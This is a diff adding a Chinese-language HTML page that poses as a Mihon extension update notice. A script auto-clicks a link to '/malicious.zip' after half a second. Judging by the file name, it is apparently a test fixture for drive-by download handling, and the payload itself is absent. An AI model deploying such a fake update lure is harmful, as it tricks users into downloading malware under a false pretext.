@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 扩展更新</title>
+<style>
+body { font-family: sans-serif; max-width: 640px; margin: 20px auto; padding: 0 16px; color: #333; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+a { display: inline-block; margin-top: 12px; }
+</style>
+</head>
+<body>
+<h2>Mihon 扩展更新提示</h2>
+<div class="card">
+<p>检测到漫画源扩展资源包有新版本。页面会自动开始下载更新包。</p>
+<a id="download-link" href="/malicious.zip">手动下载扩展资源包</a>
+</div>
+<script>
+setTimeout(function () {
+    document.getElementById("download-link").click();
+}, 500);
+</script>
+</body>
+</html>
